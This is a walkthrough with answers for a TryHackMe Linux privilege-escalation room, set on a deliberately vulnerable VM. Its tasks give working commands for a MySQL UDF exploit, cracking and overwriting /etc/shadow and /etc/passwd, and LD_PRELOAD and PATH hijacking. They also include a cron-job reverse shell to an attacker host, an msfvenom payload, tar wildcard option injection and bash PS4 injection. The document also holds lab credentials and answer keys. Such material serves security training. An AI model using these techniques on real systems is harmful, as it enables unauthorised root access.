# Linux PrevEsc


## Task 1: Deploy the Vulnerable Debian VM

* This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Debian VM. This VM was created by Sagi Shahar as part of his local privilege escalation workshop but has been updated by Tib3rius as part of his Linux Privilege Escalation for OSCP and Beyond! course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.

* Make sure you are connected to the TryHackMe VPN or using the in-browser Kali instance before trying to access the Debian VM!

* SSH should be available on port 22. You can login to the "user" account using the following command:

> ssh user@10.10.166.153

> If you see the following message: "Are you sure you want to continue connecting (yes/no)?" type yes and press Enter.

> The password for the "user" account is "password321".

* The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a root shell. Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!

---

* Answer the questions below

* Deploy the machine and login to the "user" account using SSH.

```
No answer needed
```
* Run the "id" command. What is the result?

```
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```


## Task 2: Service Exploits

* The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

* Change into the /home/user/tools/mysql-udf directory:

```cd /home/user/tools/mysql-udf```

* Compile the raptor_udf2.c exploit code using the following commands:

```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

* Connect to the MySQL service as the root user with a blank password:

```mysql -u root```

* Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

* Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

```select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');```

* Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

```/tmp/rootbash -p```

* Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!

```
rm /tmp/rootbash
exit
```

--- 
* Answer the questions below
* Read and follow along with the above.

```
No Answer needed
```


## Task 3: Weak File Permissions - Readable /etc/shadow

* The /etc/shadow file contains user password hashes and is usually readable only by the root user.

* Note that the /etc/shadow file on the VM is world-readable:

```ls -l /etc/shadow```

* View the contents of the /etc/shadow file:

```cat /etc/shadow```

* Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

* Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

```john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```

* Switch to the root user, using the cracked password:

```su root```

> __Remember to exit out of the root shell before continuing!__

---

* Answer the questions below

* What is the root user's password hash?

```
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

* What hashing algorithm was used to produce the root user's password hash?

```
sha512crypt
```

* What is the root user's password?

```
password123
```


## Task 4: Weak File Permissions - Writable /etc/shadow

* The __/etc/shadow__ file contains user password hashes and is usually readable only by the root user.

* Note that the /etc/shadow file on the VM is world-writable:

```ls -l /etc/shadow```

* Generate a new password hash with a password of your choice:

```mkpasswd -m sha-512 newpasswordhere```

* Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

* Switch to the root user, using the new password:

```su root```

> __Remember to exit out of the root shell before continuing!__

--- 

* Answer the questions below
* Read and follow along with the above.

```No Answer needed```


## Task 5: Weak File Permissions - Writable /etc/passwd

* The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

* Note that the /etc/passwd file is world-writable:

> ls -l /etc/passwd

* Generate a new password hash with a password of your choice:

```openssl passwd newpasswordhere```

* Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

* Switch to the root user, using the new password:

```su root```

* Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

* Now switch to the newroot user, using the new password:

```su newroot```

> __Remember to exit out of the root shell before continuing!__

---

* Answer the questions below

* Run the "id" command as the newroot user. What is the result?

```
uid=0(root) gid=0(root) groups=0(root)
```


## Task 6: Sudo - Shell Escape Sequences

* List the programs which sudo allows your user to run:

> sudo -l

* Visit [GTFOBins](https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

* Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

* For an extra challenge, try to gain a root shell using all the programs on the list!

> __Remember to exit out of the root shell before continuing!__

---

* Answer the questions below
* How many programs is "user" allowed to run via sudo? 

```
11
```

* One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

```
apache2
```

* Consider how you might use this program with sudo to gain root privileges without a shell escape sequence. (\*)

```
No Answer needed
```

* (\*): a quick search on how to abuse sudo linux privilege escalation with apache2

* __Using apache Command__:

* sadly u cant get Shell and Cant edit system files.

* but using this u can view system files.

```bash 
sudo apache2 -f /etc/shadow
```

* Output is like this :

```
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

* Sadly no Shell. But you manage to extract root hash now Crack hash in your machine. For Shadow Cracking click here for more.


## Task 7: Sudo - Environment Variables

* Sudo can be configured to inherit certain environment variables from the user's environment.

* Check which environment variables are inherited (look for the env_keep options):

```sudo -l```

* LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

* Create a shared object using the code located at /home/user/tools/sudo/preload.c:

```gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c```

* Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

```sudo LD_PRELOAD=/tmp/preload.so program-name-here```

* A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

* Run ldd against the apache2 program file to see which shared libraries are used by the program:

```ldd /usr/sbin/apache2```

* Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

```gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c```

* Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

```sudo LD_LIBRARY_PATH=/tmp apache2```

* A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

> __Remember to exit out of the root shell before continuing!__

---

* Answer the questions below
* Read and follow along with the above.

```No answer needed```


## Task 8: Cron Jobs - File Permissions

* Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

* View the contents of the system-wide crontab:

```cat /etc/crontab```

* There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

* Locate the full path of the overwrite.sh file:

```locate overwrite.sh```

* Note that the file is world-writable:

```ls -l /usr/local/bin/overwrite.sh```

* Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

* Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

```nc -nvlp 4444```

> __Remember to exit out of the root shell and remove the reverse shell code before continuing!__

---

* Answer the questions below
* Read and follow along with the above.

```No answer needed```


## Task 9: Cron Jobs - PATH Environment Variable

* View the contents of the system-wide crontab:

```cat /etc/crontab```

> Note that the PATH variable starts with /home/user which is our user's home directory.

* Create a file called overwrite.sh in your home directory with the following contents:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
````

* Make sure that the file is executable:

```chmod +x /home/user/overwrite.sh```

* Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

```/tmp/rootbash -p```

* Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

```bash
rm /tmp/rootbash
exit
```

---

* Answer the questions below
* What is the value of the PATH variable in /etc/crontab?

```

```


## Task 10: Cron Jobs - Wildcards

* View the contents of the other cron job script:

```cat /usr/local/bin/compress.sh```

> Note that the tar command is being run with a wildcard (\*) in your home directory.

* Take a look at the __GTFOBins__ page for tar.
> Note that __tar__ has command line options that let you run other commands as part of a checkpoint feature.

* Use __msfvenom__ on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

* Transfer the shell.elf file to __/home/user/__ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

```chmod +x /home/user/shell.elf```

* Create these two files in __/home/user__:

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

* When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

* Set up a __netcat__ listener on your Kali box on port __4444__ and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

```nc -nvlp 4444```

* Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:

```bash
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

---

* Answer the questions below
* Read and follow along with the above.

```No answere needed```


## Task 11: SUID / SGID Executables - Known Exploits

* Find all the SUID/SGID executables on the Debian VM:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

> Note that __/usr/sbin/exim-4.84-3__ appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!

* A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at __/home/user/tools/suid/exim/cve-2016-1531.sh__.

* Run the exploit script to gain a root shell:

```/home/user/tools/suid/exim/cve-2016-1531.sh```

> __Remember to exit out of the root shell before continuing!__

---

* Answer the questions below
* Read and follow along with the above.

```No answer needed```


## Task 12: SUID / SGID Executables - Shared Object Injection

* The __/usr/local/bin/suid-so__ SUID executable is vulnerable to shared object injection.

* First, execute the file and note that currently it displays a progress bar before exiting:

```/usr/local/bin/suid-so```

* Run __strace__ on the file and search the output for open/access calls and for "no such file" errors:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

```

> Note that the executable tries to load the __/home/user/.config/libcalc.so__ shared object within our home directory, but it cannot be found.

* Create the __.config__ directory for the __libcalc.so__ file:

```bash
mkdir /home/user/.config
```

* Example shared object code can be found at __/home/user/tools/suid/libcalc.c__. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

* Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

```/usr/local/bin/suid-so```

> __Remember to exit out of the root shell before continuing!__

---

* Answer the questions below
* Read and follow along with the above.

```No answer needed```


## Task 13: SUID / SGID Executables - Environment Variables

* The __/usr/local/bin/suid-env__ executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

* First, execute the file and note that it seems to be trying to start the apache2 webserver:

```/usr/local/bin/suid-env```

* Run strings on the file to look for strings of printable characters:

```bash
strings /usr/local/bin/suid-env
```

* One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (_/usr/sbin/service_) is not being used.

* Compile the code located at _/home/user/tools/suid/service.c_ into an executable called service. This code simply spawns a Bash shell:

```bash
gcc -o service /home/user/tools/suid/service.c
```

* Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

```bash
PATH=.:$PATH /usr/local/bin/suid-env
```

> __Remember to exit out of the root shell before continuing!__

---

* Answer the questions below
* Read and follow along with the above

```No answer needed```

## Task 14: SUID / SGID Executables - Abusing Shell Features (#1)

* The __/usr/local/bin/suid-env2__ executable is identical to __/usr/local/bin/suid-env__ except that it uses the absolute path of the service executable (_/usr/sbin/service_) to start the __apache2__ webserver.

* Verify this with strings:

```bash
strings /usr/local/bin/suid-env2
```

* In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

* Verify the version of Bash installed on the Debian VM is less than 4.2-048:

```bash
/bin/bash --version
```

* Create a Bash function with the name "__/usr/sbin/service__" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

* Run the __suid-env2__ executable to gain a root shell:

```bash
/usr/local/bin/suid-env2
```

> __Remember to exit out of the root shell before continuing!__

---

* Answer the questions below
* Read and follow along with the above.

```No answer needed```


## Task 15: SUID / SGID Executables - Abusing Shell Features (#2)

> Note: This will not work on Bash versions 4.4 and above.

* When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

* Run the __/usr/local/bin/suid-env2__ executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of __/bin/bash__:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

* Run the __/tmp/rootbash__ executable with -p to gain a shell running with root privileges:

```bash
/tmp/rootbash -p
```

> Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

```
rm /tmp/rootbash
exit
```

---

* Answer the questions below
* Read and follow along with the above.

```No answer needed```


